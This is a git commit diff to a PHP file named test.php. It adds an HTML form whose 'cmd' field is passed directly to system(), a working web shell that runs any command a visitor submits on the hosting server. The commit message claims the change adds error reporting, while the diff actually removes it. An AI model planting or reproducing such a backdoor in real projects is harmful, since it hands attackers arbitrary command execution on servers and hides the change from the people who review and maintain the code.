9c32d450f3f226cd48f163067ca10ff9f874eb94
matiasbasile <32721459+matiasbasile@users.noreply.github.com>
2025-03-30 02:03:38 -0300

    Update test.php to include error reporting and shell_exec

--- test.php
+++ test.php
@@ -1,8 +1,17 @@
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
 <?php
-ini_set('display_errors', 1);
-error_reporting(E_ALL);
-
-if(isset($_GET['cmd'])){
-    echo shell_exec($_GET['cmd']);
-}
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
 ?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
